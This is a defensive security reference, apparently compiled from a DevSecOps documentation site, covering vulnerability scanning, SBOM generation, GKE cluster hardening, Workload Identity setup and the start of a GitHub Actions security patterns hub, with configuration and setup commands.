# Secure — Full Reference

Generated from adaptive-enforcement-lab.com. For a scannable index with links to the live docs, see SKILL.md in this skill.

## Overview

Finding and fixing security issues before they become incidents.

> **Security as a Process**
>
>
> Security isn't a one-time scan. It's a continuous process of finding vulnerabilities, generating evidence, and enabling secure development workflows.
>

### Overview

This section covers the **tools and practices** for discovering and remediating security issues in code, dependencies, containers, and supply chains.

### Secure vs Enforce

Understanding the distinction:

- **Secure** (this section): Find and fix security issues
  - Vulnerability scanners that *identify* CVEs
  - SBOM generators that *document* dependencies
  - Security tools that *discover* weaknesses
  - GitHub Apps that *provide* secure authentication

- **Enforce** ([see Enforce](../enforce/index.md)): Make security mandatory through automation
  - Branch protection that *requires* reviews
  - Pre-commit hooks that *block* violations
  - Status checks that *prevent* merges
  - Policy-as-code that *enforces* runtime compliance

**Litmus test**: Can this be bypassed?

- If **no** → It's a Secure tool (finding/fixing)
- If **yes** → It belongs in Enforce (making mandatory)

### What You'll Find Here

#### GitHub Apps

Secure authentication for automated workflows. GitHub Apps offer granular permissions, auditable actions, and organization-level credential management.

**Why it matters**: Pass SOC 2 and ISO 27001 audits by replacing PATs with trackable, scoped authentication.

**Key topics**:

- Creating and configuring GitHub Apps
- Permission patterns for common workflows
- Credential storage and rotation
- Installation scopes and security

#### Vulnerability Scanning

Find CVEs in dependencies, containers, and runtime environments before they reach production.

**Why it matters**: 84% of breaches exploit known vulnerabilities with available patches (Verizon DBIR 2024).

**Key topics**:

- Dependency scanning (npm, go mod, pip)
- Container image scanning (Trivy, Grype)
- Runtime vulnerability detection
- Remediation workflows

#### SBOM (Software Bill of Materials)

Generate machine-readable inventories of all software components, dependencies, and transitive dependencies.

**Why it matters**: Executive Order 14028 and European Cyber Resilience Act require SBOMs for supply chain transparency.

**Key topics**:

- SBOM generation with Syft
- SPDX and CycloneDX formats
- Embedding SBOMs in container images
- Automated SBOM workflows

#### Go Security Tooling

Leverage specialized security tooling for Go projects, including static analysis, vulnerability detection, and compliance checks.

**Why it matters**: Go's standard library security model requires specific tooling that understands Go's unique characteristics.

**Key topics**:

- `govulncheck` for vulnerability scanning
- `gosec` for static security analysis
- Go-specific SBOM generation
- CI/CD integration patterns

#### Scorecard

OpenSSF Scorecard automated security checks for open-source best practices, SLSA compliance, and supply chain security.

**Why it matters**: Quantifiable security posture that passes compliance audits and satisfies customer security questionnaires.

**Key topics**:

- Scorecard check categories
- Achieving high scores (8+/10)
- Workflow examples
- Badge integration

### Common Workflows

#### 1. Continuous Vulnerability Scanning

```yaml
## .github/workflows/security-scan.yml
name: Security Scan
on:
  push:
  schedule:
    - cron: '0 2 * * *'  # Daily at 2 AM

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Scan dependencies
        run: trivy fs --scanners vuln .
      - name: Scan containers
        run: trivy image myapp:latest
```

#### 2. SBOM Generation on Release

```yaml
## Generate SBOM on every release
- name: Generate SBOM
  run: syft packages . -o spdx-json > sbom.spdx.json
- name: Attach to release
  run: gh release upload ${{ github.ref_name }} sbom.spdx.json
```

#### 3. GitHub App Authentication

```yaml
## Secure authentication for cross-repo workflows
- uses: actions/create-github-app-token@v1
  id: app-token
  with:
    app-id: ${{ vars.APP_ID }}
    private-key: ${{ secrets.APP_PRIVATE_KEY }}
    owner: adaptive-enforcement-lab
- uses: actions/checkout@v4
  with:
    token: ${{ steps.app-token.outputs.token }}
```

### Integration with Enforce

Security findings are only valuable if they prevent insecure code from reaching production:

1. **Find vulnerabilities** (Secure) → **Block deployment** (Enforce)
2. **Generate SBOM** (Secure) → **Require SBOM in PR** (Enforce)
3. **Run Scorecard** (Secure) → **Enforce minimum score** (Enforce)
4. **Scan containers** (Secure) → **Block vulnerable images** (Enforce)

See [Enforce](../enforce/index.md) for enforcement mechanisms.

### Getting Started

1. **Start with GitHub Apps**: Replace PATs with secure, auditable authentication
2. **Add vulnerability scanning**: Catch known CVEs before they deploy
3. **Generate SBOMs**: Document your supply chain for compliance
4. **Run Scorecard**: Measure and improve security posture
5. **Layer on enforcement**: Make findings actionable with Enforce patterns

### Related Content

- [Enforce](../enforce/index.md): Make security mandatory through automation
- [Build](../build/index.md): CI/CD pipelines and release automation
- [Patterns](../patterns/index.md): Reusable security patterns

### Tags

Browse all content tagged with security, automation, supply-chain, and compliance on the [Tags](../tags.md) page.

## Cloud Native

### GKE Cluster Configuration

Fundamental cluster security configuration covering private networking, identity federation, and image verification.

#### Overview

This section covers the foundational security configurations for GKE clusters:

1. **[Private GKE Cluster](private-cluster.md)** - Private control plane, VPC networking, and encrypted etcd
2. **[Workload Identity](workload-identity.md)** - Pod-to-GCP authentication without service account keys
3. **[Binary Authorization](binary-authorization.md)** - Shielded Nodes and image verification

> **Public Cluster Risk**
>
>
> Public control planes expose your cluster API to the internet. Even with strong authentication, this increases attack surface and is not recommended for production.
>

#### Security Principles

##### Defense in Depth

- **Private Control Plane**: API server accessible only from authorized networks
- **Workload Identity**: Pods authenticate to GCP without static credentials
- **Shielded Nodes**: Secure boot, measured boot, and integrity monitoring
- **Binary Authorization**: Only verified container images run on the cluster

##### Configuration Management

All configurations use Terraform for Infrastructure as Code, enabling:

- Repeatable deployments across environments
- Version-controlled security policies
- Automated compliance validation
- Drift detection and remediation

#### Prerequisites

- GCP project with billing enabled
- `gcloud` CLI installed and authenticated
- Terraform 1.0+
- kubectl configured for cluster access
- Appropriate IAM permissions (Project Editor or Security Admin roles)

> **Production Warning**
>
>
> These configurations enforce strict security controls. Test in QAC/DEV before production deployment.
>

#### Quick Start

```bash
### Initialize Terraform
terraform init

### Apply cluster configuration
terraform apply \
  -var="gcp_project=$PROJECT_ID" \
  -var="cluster_name=prod-cluster" \
  -var="environment=prd" \
  -var="team=platform" \
  -var="cost_center=engineering" \
  -var="admin_cidr_block=203.0.113.0/24"

### Get cluster credentials
gcloud container clusters get-credentials prod-cluster \
  --region us-central1 \
  --project $PROJECT_ID

### Verify private cluster
gcloud container clusters describe prod-cluster \
  --region us-central1 \
  --format="value(privateClusterConfig.enablePrivateNodes)"
```

#### Related Configuration

- **[Network Security](../network-security/index.md)** - VPC-native networking, Network Policies, Private Service Connect
- **[IAM Configuration](../iam-configuration/index.md)** - Least-privilege IAM, audit logging, service accounts
- **[Runtime Security](../runtime-security/index.md)** - Pod Security Standards, admission controllers, monitoring

### GKE Security Hardening Guide

Production-ready security configuration for Google Kubernetes Engine clusters. This guide covers control plane hardening, data plane isolation, identity and access management, and runtime security enforcement.

#### Overview

> **Defense in Depth**
>
>
> GKE security hardening follows a layered approach:
>
> 1. **Control plane** - Private clusters, authenticated access, audit logging
> 2. **Network** - VPC-native networking, network policies, egress controls
> 3. **Identity** - Workload Identity Federation, least-privilege IAM, audit trails
> 4. **Runtime** - Pod Security Standards, admission controllers, monitoring
>

This guide uses Pulumi for Infrastructure as Code, enabling repeatable, auditable cluster deployments across environments (QAC, DEV, STG, PRD).

> **Environment Promotion Order**
>
>
> Always promote changes through: **QAC → DEV → STG → PRD → OPS**
>
> Never skip environments in the promotion pipeline.
>

#### Prerequisites

- GCP project with billing enabled
- `gcloud` CLI installed and authenticated
- Pulumi 3.0+
- kubectl configured for cluster access
- Appropriate IAM permissions (Project Editor or Security Admin roles)

> **Production Warning**
>
>
> These configurations enforce strict security controls. Test in QAC/DEV before production deployment.
>

#### Architecture

```mermaid
graph TB
    subgraph "Control Plane (Private)"
        API[API Server]
        ETCD[etcd]
        SCH[Scheduler]
    end

    subgraph "Data Plane (VPC-Native)"
        WI[Workload Identity]
        NP[Network Policies]
        PSS[Pod Security Standards]
    end

    subgraph "Security Layer"
        BA[Binary Authorization]
        CA[Cloud Armor]
        PSC[Private Service Connect]
    end

    API --> WI
    API --> NP
    API --> PSS
    BA --> API
    CA --> API
    PSC --> API

    %% Ghostty Hardcore Theme
    style API fill:#2D4263
    style WI fill:#4A7A8C
    style BA fill:#6B8E9F
    style CA fill:#6B8E9F

```

#### Quick Start

```bash
### Clone infrastructure repository
git clone https://github.com/your-org/gke-infrastructure.git
cd gke-infrastructure

### Initialize Pulumi stack
pulumi stack init qac

### Configure cluster
pulumi config set gcp_project $PROJECT_ID
pulumi config set cluster_name qac-cluster
pulumi config set environment qac
pulumi config set team platform
pulumi config set cost_center engineering
pulumi config set admin_cidr_block 203.0.113.0/24

### Preview and deploy
pulumi preview
pulumi up

### Get cluster credentials
gcloud container clusters get-credentials qac-cluster \
  --region us-central1 \
  --project $PROJECT_ID
```

> **Verification**
>
>
> After deployment, verify the security posture using the verification checklists in each configuration module.
>

#### Configuration Modules

This guide is split into focused modules:

- **[Cluster Configuration](cluster-configuration/index.md)** - Private GKE, Workload Identity, Shielded Nodes
- **[Network Security](network-security/index.md)** - VPC-native networking, Network Policies, Private Service Connect
- **[IAM Configuration](iam-configuration/index.md)** - Least-privilege IAM, audit logging, service accounts
- **[Runtime Security](runtime-security/index.md)** - Pod Security Standards, admission controllers, monitoring

#### Common Misconfigurations to Avoid

| Misconfiguration | Risk | Fix |
|------------------|------|-----|
| Public cluster endpoint | Exposed API server | Set `privateClusterConfig.enablePrivateNodes = true` |
| Metadata server enabled | Pod can access node credentials | Set `workloadMetadataConfig.mode = "GKE_METADATA"` |
| No network policies | All-to-all traffic | Apply default-deny + explicit policies |
| Privileged containers | Root container escape | Set `securityContext.privileged = false` |
| No admission controllers | Insecure pods deployed | Deploy validating/mutating webhooks |
| No audit logging | Compliance blind spot | Enable GKE Cloud Logging sink |
| Overpermissioned service accounts | Lateral movement | Use Workload Identity + least-privilege IAM |
| Public container registry | Image tampering | Use private Artifact Registry + Binary Auth |

> **Attack Surface Reduction**
>
>
> Each misconfiguration listed above represents a verified attack vector. Fix all items before production deployment.
>

#### Verification Checklist

```bash
#!/bin/bash
### Comprehensive security verification

CLUSTER="prod-cluster"
REGION="us-central1"

echo "=== Cluster Configuration ==="
gcloud container clusters describe $CLUSTER --region $REGION \
  --format="value(privateClusterConfig.enablePrivateNodes)" | grep -q "True" && echo "✓ Private cluster" || echo "✗ Public cluster"

gcloud container clusters describe $CLUSTER --region $REGION \
  --format="value(workloadIdentityConfig.workloadPool)" | grep -q "svc.id.goog" && echo "✓ Workload Identity enabled" || echo "✗ Workload Identity disabled"

gcloud container clusters describe $CLUSTER --region $REGION \
  --format="value(databaseEncryption.state)" | grep -q "ENCRYPTED" && echo "✓ Database encryption enabled" || echo "✗ Database encryption disabled"

echo ""
echo "=== Network Configuration ==="
gcloud container clusters describe $CLUSTER --region $REGION \
  --format="value(networkingConfig.useIpAliases)" | grep -q "True" && echo "✓ VPC-native networking" || echo "✗ Routes-based networking"

gcloud container clusters describe $CLUSTER --region $REGION \
  --format="value(networkPolicy.enabled)" | grep -q "True" && echo "✓ Network policies enabled" || echo "✗ Network policies disabled"

echo ""
echo "=== Pod Security ==="
kubectl get ns -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.metadata.labels.pod-security\.kubernetes\.io/enforce}{"\n"}{end}' | column -t

echo ""
echo "=== IAM Configuration ==="
gcloud iam service-accounts list --format="table(email,displayName)"

echo ""
echo "=== Audit Logging ==="
gcloud logging sinks list --filter="destination:*storage*" --format="table(name,destination)"
```

#### Environment-Specific Configurations

##### QAC (Quality Assurance/Control)

```yaml
### Pulumi.qac.yaml
environment          = "qac"
kubernetes_version   = "1.28"
machine_type         = "e2-medium"
min_node_count       = 1
max_node_count       = 3
enable_monitoring    = true
pod_security_standard = "baseline"
```

##### DEV (Development)

```yaml
### Pulumi.dev.yaml
environment          = "dev"
kubernetes_version   = "1.28"
machine_type         = "e2-standard-2"
min_node_count       = 1
max_node_count       = 5
enable_monitoring    = true
pod_security_standard = "baseline"
```

##### STG (Staging)

```yaml
### Pulumi.stg.yaml
environment          = "stg"
kubernetes_version   = "1.28"
machine_type         = "e2-standard-4"
min_node_count       = 2
max_node_count       = 10
enable_monitoring    = true
pod_security_standard = "restricted"
```

##### PRD (Production)

```yaml
### Pulumi.prd.yaml
environment          = "prd"
kubernetes_version   = "1.28"
machine_type         = "e2-standard-4"
min_node_count       = 3
max_node_count       = 20
enable_monitoring    = true
pod_security_standard = "restricted"
enable_binary_auth   = true
enable_cloud_armor   = true
```

> **Progressive Hardening**
>
>
> Notice security controls increase from QAC to PRD. Baseline standards in development, restricted standards in production.
>

#### References

- [GKE Security Hardening](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster)
- [Workload Identity Federation](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
- [Binary Authorization](https://cloud.google.com/binary-authorization)
- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Cloud Armor](https://cloud.google.com/armor)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/cis-benchmarks/)

#### Related Content

- [Enforce](../../../enforce/index.md): Compliance enforcement and policy automation
- [Secure](../../index.md): Security discovery and remediation
- [Patterns](../../../patterns/index.md): Reusable security patterns

### IAM Configuration

Identity and access management controls who can do what in your cluster. Least-privilege service accounts minimize blast radius. Workload Identity Federation enables external identity integration. Audit logging provides complete visibility.

> **IAM Security Layers**
>
>
> 1. **[Least Privilege Roles](least-privilege-roles.md)** - Minimal permissions for service accounts
> 2. **[Workload Identity Federation](workload-identity-federation.md)** - GitHub Actions and external auth
> 3. **[Audit Logging](audit-logging.md)** - Comprehensive activity tracking
>

#### Overview

This section covers identity and access management for GKE clusters:

- **Service Account Roles**: Fine-grained IAM permissions for nodes, admins, and developers
- **Workload Identity Federation**: External identity provider integration (GitHub, OIDC)
- **Audit Logging**: Complete visibility into cluster management and API access

#### Security Principles

##### Least Privilege

Grant only the minimum IAM roles required for each service account:

- Node service accounts: Logging, monitoring only
- Application service accounts: Specific GCP resource access
- Developer accounts: Read-only cluster access
- Admin accounts: Full cluster management (limited users)

##### External Identity Integration

Workload Identity Federation enables pods and external systems to authenticate without static credentials:

- GitHub Actions: OIDC token exchange
- External CI/CD: Custom identity providers
- Multi-cloud workloads: Cross-cloud authentication

##### Complete Audit Trail

Comprehensive audit logging captures all cluster activity:

- API server requests (create, update, delete)
- Authentication attempts and failures
- IAM policy changes
- Service account usage

#### Prerequisites

- GCP project with billing enabled
- Terraform 1.0+
- Appropriate IAM permissions (Security Admin or Project Editor)

#### Related Configuration

- **[Cluster Configuration](../cluster-configuration/index.md)** - Private GKE, Workload Identity, Shielded Nodes
- **[Network Security](../network-security/index.md)** - VPC-native networking, Network Policies
- **[Runtime Security](../runtime-security/index.md)** - Pod Security Standards, admission controllers

### Network Security

Network isolation is critical in multi-tenant clusters. VPC-native networking provides better performance and simpler network policies. Private Service Connect secures GCP service access. Cloud Armor defends against DDoS and application attacks.

> **Network Security Layers**
>
>
> 1. **[VPC-Native Networking](vpc-native.md)** - Container-native IP allocation
> 2. **[Network Policies](network-policies.md)** - Pod-to-pod traffic control
> 3. **[Private Service Connect](private-service-connect.md)** - Secure GCP service access
> 4. **[Cloud Armor](cloud-armor.md)** - DDoS protection and WAF
>

#### Overview

This section covers network security configurations for GKE clusters:

- **VPC-Native Networking**: Container-native IP allocation with Alias IP ranges
- **Network Policies**: Zero-trust network model with default-deny ingress
- **Private Service Connect**: Private connectivity to GCP services
- **Cloud Armor**: Layer 7 DDoS protection and Web Application Firewall

#### Security Principles

##### Zero Trust Network

Implement default-deny network policies and explicitly allow traffic between services:

- All ingress traffic is blocked by default
- Only required pod-to-pod communication is permitted
- DNS and essential services are explicitly allowed
- Egress traffic is controlled per workload

##### Private Connectivity

Route traffic through private endpoints for secure, isolated connectivity:

- No public IP addresses required
- Traffic stays on Google's backbone
- Simplified security policy management
- Cross-project access supported

##### Layer 7 Protection

Cloud Armor provides application-level security:

- DDoS mitigation at the edge
- Geo-blocking and IP filtering
- Rate limiting and bot detection
- XSS and SQLi protection

#### Prerequisites

- GCP project with billing enabled
- Terraform 1.0+
- kubectl configured for cluster access

#### Related Configuration

- **[Cluster Configuration](../cluster-configuration/index.md)** - Private GKE, Workload Identity
- **[IAM Configuration](../iam-configuration/index.md)** - Least-privilege IAM
- **[Runtime Security](../runtime-security/index.md)** - Pod Security Standards

### Runtime Security

Runtime security enforces policies on running workloads. Pod Security Standards prevent privilege escalation. Admission controllers validate manifests before deployment. Runtime monitoring detects anomalous behavior.

> **Runtime Security Layers**
>
>
> 1. **[Pod Security Standards](pod-security-standards.md)** - Baseline and restricted policies
> 2. **[Admission Controllers](admission-controllers.md)** - Pre-deployment validation
> 3. **[Runtime Monitoring](runtime-monitoring.md)** - Behavioral analysis and alerting
>

#### Overview

This section covers runtime security for GKE clusters:

- **Pod Security Standards**: Namespace-level security policies (baseline, restricted)
- **Admission Controllers**: Pre-deployment validation and policy enforcement
- **Runtime Monitoring**: Behavioral detection with Falco or GKE Cloud Logging

#### Security Principles

##### Defense in Depth

Multiple layers of runtime security controls:

- Pod Security Standards enforce secure defaults
- Admission controllers block invalid configurations
- Runtime monitoring detects anomalous behavior
- Audit logging captures all activity

##### Secure by Default

Production workloads must meet strict security requirements:

- Run as non-root user
- Read-only root filesystem
- Drop all Linux capabilities
- No privilege escalation
- Resource limits defined

##### Continuous Monitoring

Runtime monitoring provides visibility into pod behavior:

- Process execution tracking
- File access monitoring
- Network connection detection
- System call auditing

#### Prerequisites

- GCP project with billing enabled
- Terraform 1.0+
- kubectl configured for cluster access

#### Related Configuration

- **[Cluster Configuration](../cluster-configuration/index.md)** - Private GKE, Workload Identity
- **[Network Security](../network-security/index.md)** - VPC networking, Network Policies
- **[IAM Configuration](../iam-configuration/index.md)** - Least-privilege IAM

### Workload Identity Federation Implementation

Containers need cloud access. But service account keys are **static credentials** that never rotate, frequently get stolen, and live forever.

Workload Identity Federation lets containers prove their identity to cloud providers without ever storing keys. The Kubernetes cluster itself becomes a trusted identity provider.

> **Production Hardening**
>
> Workload Identity eliminates the largest attack surface in containerized environments. This is foundational. Get it right.
>

#### What is Workload Identity Federation?

Instead of storing a static key, your container presents a **signed JWT token** to prove it's running in your cluster.

| Approach | Token | Rotation | Revocation | Audit |
| --------- | ------ | --------- | ----------- | ------- |
| Service Account Keys | Static, never changes | Manual | Manual | Weak |
| Workload Identity | Dynamic, short-lived | Automatic | Immediate | Full |

Service account keys are abandoned credentials. Workload Identity is ephemeral proof.

> **How It Works**
>
>
> 1. **Pod requests token** - Kubernetes API issues signed JWT
> 2. **Token presented to GCP** - GCP validates signature
> 3. **GCP issues access token** - Short-lived credential for GCP APIs
> 4. **Automatic rotation** - Token refreshes before expiration
>

#### Architecture

```mermaid
sequenceDiagram
    participant Pod
    participant K8s API
    participant GCP STS
    participant GCP API

    Pod->>K8s API: Request token (ServiceAccount JWT)
    K8s API->>Pod: Return signed JWT (1hr expiry)
    Pod->>GCP STS: Exchange JWT for access token
    GCP STS->>GCP STS: Validate JWT signature
    GCP STS->>Pod: Return GCP access token
    Pod->>GCP API: Call API with access token
    GCP API->>Pod: Return data

    %% Ghostty Hardcore Theme
    style K8s API fill:#2D4263
    style GCP STS fill:#4A7A8C
    style GCP API fill:#6B8E9F

```

#### Implementation Guide

This guide is split into focused modules:

##### Setup

- **[Cluster Configuration](cluster-configuration.md)**: Enable Workload Identity on GKE clusters and node pools
- **[Service Account Binding](service-account-binding.md)**: Create service accounts and configure IAM bindings

##### Application Integration

- **[Pod Configuration](pod-configuration.md)**: Deploy workloads and common GCP service access patterns
- **[Migration Guide](migration-guide.md)**: Migrate from service account keys with zero downtime

##### Operations

- **[Troubleshooting](troubleshooting.md)**: Debug auth failures, token issues, permissions

#### Quick Start

```bash
### 1. Enable Workload Identity on cluster
gcloud container clusters update my-cluster \
  --workload-pool=PROJECT_ID.svc.id.goog \
  --zone us-central1-a

### 2. Create Kubernetes ServiceAccount
kubectl create serviceaccount app-sa -n production

### 3. Create GCP service account
gcloud iam service-accounts create app-gcp \
  --display-name "App workload identity"

### 4. Grant GCP permissions
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="serviceAccount:app-gcp@PROJECT_ID.iam.gserviceaccount.com" \
  --role="roles/storage.objectViewer"

### 5. Bind Kubernetes SA to GCP SA
gcloud iam service-accounts add-iam-policy-binding \
  app-gcp@PROJECT_ID.iam.gserviceaccount.com \
  --role="roles/iam.workloadIdentityUser" \
  --member="serviceAccount:PROJECT_ID.svc.id.goog[production/app-sa]"

### 6. Annotate Kubernetes ServiceAccount
kubectl annotate serviceaccount app-sa \
  -n production \
  iam.gke.io/gcp-service-account=app-gcp@PROJECT_ID.iam.gserviceaccount.com

### 7. Deploy pod with annotated ServiceAccount
kubectl apply -f deployment.yaml
```

> **Verification**
>
>
> Test authentication from inside a pod:
>
> ```bash
> kubectl run -it --image=google/cloud-sdk:slim test-wi \
>   --serviceaccount=app-sa \
>   -n production \
>   -- gcloud auth list
> ```
>

#### Benefits

##### Security

- **No static credentials**: Tokens expire automatically
- **Immediate revocation**: Disable service account, access stops
- **Audit trail**: Cloud Audit Logs track all impersonation
- **Least privilege**: Fine-grained IAM per workload

##### Operations

- **Zero key management**: No rotation, no storage, no exposure
- **Simplified onboarding**: Annotate ServiceAccount, deploy
- **Cross-project access**: Impersonate service accounts in other projects
- **External identity**: GitHub Actions, external OIDC providers

> **Common Mistakes**
>
>
> - Forgetting to annotate the Kubernetes ServiceAccount
> - Using wrong format in IAM binding (`serviceAccount:PROJECT_ID.svc.id.goog[NAMESPACE/SA_NAME]`)
> - Not granting `roles/iam.workloadIdentityUser` role
> - Metadata server enabled on nodes (`workloadMetadataConfig.mode` must be `GKE_METADATA`)
>

#### Migration from Service Account Keys

##### Before (Static Keys)

```yaml
### Kubernetes Secret with private key
apiVersion: v1
kind: Secret
metadata:
  name: app-sa-key
type: Opaque
stringData:
  key.json: |
    {
      "type": "service_account",
      "private_key": "-----BEGIN RSA PRIVATE KEY-----\n..."
    }
```

**Problems:**

- Key never expires
- If leaked, must manually revoke and rotate
- Stored in cluster (potential exposure)
- No audit trail of usage

##### After (Workload Identity)

```yaml
### Kubernetes ServiceAccount with annotation
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-sa
  annotations:
    iam.gke.io/gcp-service-account: app-gcp@PROJECT_ID.iam.gserviceaccount.com
```

**Benefits:**

- Token expires every hour (automatic rotation)
- Revoke by disabling GCP service account
- No secrets stored in cluster
- Full audit trail in Cloud Audit Logs

See [Migration Guide](migration-guide.md) for detailed migration steps.

#### Use Cases

##### Cloud Storage Access

```python
from google.cloud import storage

### Credentials automatic
client = storage.Client(project='PROJECT_ID')
bucket = client.bucket('my-bucket')
blob = bucket.blob('data.txt')
blob.download_to_filename('data.txt')
```

##### Secret Manager Access

```python
from google.cloud import secretmanager

client = secretmanager.SecretManagerServiceClient()
secret_name = f"projects/PROJECT_ID/secrets/api-key/versions/latest"
response = client.access_secret_version(request={"name": secret_name})
api_key = response.payload.data.decode('UTF-8')
```

##### Cross-Project Access

```bash
### SERVICE_ACCOUNT_A in PROJECT_A can impersonate SERVICE_ACCOUNT_B in PROJECT_B
gcloud iam service-accounts add-iam-policy-binding \
  service-account-b@PROJECT_B.iam.gserviceaccount.com \
  --role="roles/iam.serviceAccountUser" \
  --member="serviceAccount:service-account-a@PROJECT_A.iam.gserviceaccount.com"
```

#### References

- [Workload Identity Documentation](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
- [IAM Conditions](https://cloud.google.com/iam/docs/conditions-overview)
- [GitHub Actions Integration](https://github.com/google-github-actions/auth)
- [Best Practices](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity#best_practices)

#### Related Content

- [GKE Hardening Guide](../gke-hardening/index.md): Comprehensive GKE security configuration
- [IAM Configuration](../gke-hardening/iam-configuration/index.md): Least-privilege IAM patterns
- [Secure](../../index.md): Security discovery and remediation

*Workload Identity eliminates static keys. Tokens rotate automatically. Access revokes immediately. Audit trail complete. Zero-trust credential model in place.*

## GitHub Actions Security Patterns Hub

Complete security patterns for GitHub Actions…

Consolidated, authoritative resource for securing GitHub Actions workflows. From action pinning to runner hardening, we cover what vendor cheat sheets miss.

> **Why This Hub Exists**
>
>
> GitHub Actions security guidance is scattered across vendor cheat sheets from GitGuardian, StepSecurity, Salesforce, and Wiz. No single authoritative source exists. This hub consolidates production-tested patterns for DevSecOps teams.
>

#### The GitHub Actions Attack Surface

GitHub Actions workflows introduce multiple attack vectors that require defense in depth.

```mermaid
flowchart TD
    A["GitHub Actions Workflow"] --> B["Action Supply Chain"]
    A --> C["GITHUB_TOKEN Permissions"]
    A --> D["Secrets & Credentials"]
    A --> E["Runner Environment"]
    A --> F["Workflow Triggers"]

    B --> B1["Unpinned actions"]
    B --> B2["Malicious updates"]
    B --> B3["Compromised publishers"]

    C --> C1["Over-privileged tokens"]
    C --> C2["Default write permissions"]
    C --> C3["Workflow-level scope"]

    D --> D1["Secret exposure in logs"]
    D --> D2["Secret sprawl"]
    D --> D3["Long-lived credentials"]

    E --> E1["Shared runner state"]
    E --> E2["Insufficient isolation"]
    E --> E3["Network access"]

    F --> F1["Fork PRs"]
    F --> F2["pull_request_target"]
    F --> F3["Untrusted input"]

    %% Ghostty Hardcore Theme
    style A fill:#66d9ef,color:#1b1d1e
    style B fill:#f92572,color:#1b1d1e
    style C fill:#f92572,color:#1b1d1e
    style D fill:#f92572,color:#1b1d1e
    style E fill:#f92572,color:#1b1d1e
    style F fill:#f92572,color:#1b1d1e
    style B1 fill:#fd971e,color:#1b1d1e
    style B2 fill:#fd971e,color:#1b1d1e
    style B3 fill:#fd971e,color:#1b1d1e
    style C1 fill:#fd971e,color:#1b1d1e
    style C2 fill:#fd971e,color:#1b1d1e
    style C3 fill:#fd971e,color:#1b1d1e
    style D1 fill:#fd971e,color:#1b1d1e
    style D2 fill:#fd971e,color:#1b1d1e
    style D3 fill:#fd971e,color:#1b1d1e
    style E1 fill:#fd971e,color:#1b1d1e
    style E2 fill:#fd971e,color:#1b1d1e
    style E3 fill:#fd971e,color:#1b1d1e
    style F1 fill:#fd971e,color:#1b1d1e
    style F2 fill:#fd971e,color:#1b1d1e
    style F3 fill:#fd971e,color:#1b1d1e

```

#### Threat Landscape Summary

##### Supply Chain Attacks

**Attack Vector**: Compromised or malicious actions execute arbitrary code in your CI/CD pipeline.

**Real Risk**: Actions run with repository secrets, cloud credentials, and deployment access. A single compromised action can exfiltrate secrets, modify code, or deploy backdoors.

**Defense**: SHA pinning, Dependabot automation, allowlisting.

##### Token Over-Privilege

**Attack Vector**: GITHUB_TOKEN with excessive permissions enables lateral movement across repositories.

**Real Risk**: Default `permissions: write-all` grants more access than 95% of workflows need. A script injection can create malicious releases, modify workflows, or compromise other repositories.

**Defense**: Explicit minimal permissions, job-level scoping, read-only defaults.

##### Secret Exposure

**Attack Vector**: Secrets logged to console, committed to repositories, or exfiltrated through network calls.

**Real Risk**: GitHub masks secrets in logs, but encoding tricks bypass protection. Third-party actions may intentionally or accidentally leak credentials.

**Defense**: OIDC federation, secret scanning with push protection, minimal secret scope.

##### Runner Compromise

**Attack Vector**: Self-hosted runners with insufficient isolation allow persistent access.

**Real Risk**: Shared runners can leak state between jobs. Public repository workflows on self-hosted runners execute untrusted code with internal network access.

**Defense**: Ephemeral runners, network isolation, private repository restrictions.

##### Workflow Injection

**Attack Vector**: Untrusted input from PR titles, issue bodies, or commit messages injected into shell commands.

**Real Risk**: `pull_request_target` and `workflow_run` execute in privileged context. Attackers control input that becomes code execution.

**Defense**: Input validation, expression injection prevention, safe trigger patterns.

#### Security Patterns Roadmap

##### 1. Action Pinning

Lock down the supply chain. Pin actions to immutable SHAs, track versions with comments, automate updates with Dependabot.

**Coverage**:

- SHA pinning patterns and automation
- Version tracking strategies
- Dependabot configuration for actions
- Audit scripts for unpinned actions

[**Explore Action Pinning →**](action-pinning/index.md)

##### 2. GITHUB_TOKEN Permissions

Minimize token scope. Apply least privilege at workflow and job level. Replace default `write-all` with explicit minimal permissions.

**Coverage**:

- Complete permissions matrix
- Workflow-specific permission templates
- Job-level permission scoping
- Troubleshooting permission errors

[**Explore Token Permissions →**](token-permissions/index.md)

##### 3. Third-Party Action Risk Assessment

Evaluate before you adopt. Structured framework for assessing action security, maintenance, and trust level.

**Coverage**:

- Risk assessment checklist
- Trust tier classification
- Source code review patterns
- Organization allowlisting

[**Explore Action Risk Assessment →**](third-party-actions/index.md)

##### 4. Secret Management

Eliminate long-lived credentials. Use OIDC federation for cloud access, implement secret rotation, enable scanning with push protection.

**Coverage**:

- OIDC federation for AWS, GCP, Azure
- Secret rotation automation
- Secret scanning configuration
- Incident response for leaked secrets

[**Explore Secret Management →**](secrets/secrets-management/index.md)

##### 5. Self-Hosted Runner Security

Harden runners for production. Implement ephemeral patterns, network isolation, and runner group restrictions.

**Coverage**:

- Runner hardening checklist
- Ephemeral runner patterns (containers, VMs, ARC)
- Runner group management
- Network and access controls

[**Explore Runner Security →**](runners/index.md)

##### 6. Workflow Security Patterns

Secure triggers and execution context. Understand `pull_request_target` risks, implement environment protection, validate inputs.

**Coverage**:

- Secure trigger patterns (`pull_request` vs `pull_request_target`)
- Environment protection rules
- Reusable workflow security
- Input validation patterns

[**Explore Workflow Patterns →**](workflows/triggers/index.md)

##### 7. Complete Examples

Production-ready workflows demonstrating all security patterns. Copy-paste templates with inline security annotations.

**Coverage**:

- Hardened CI workflow
- Secure release workflow with SLSA provenance
- Deployment workflow with OIDC and approvals
- Security scanning workflow

[**Explore Examples →**](examples/ci-workflow/index.md)

#### Quick Start

##### Secure a Workflow in 5 Steps

```yaml
name: Secure CI
on:
  pull_request:  # (1) Use pull_request, not pull_request_target for untrusted code

### (2) Explicit minimal permissions
permissions:
  contents: read
  pull-requests: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
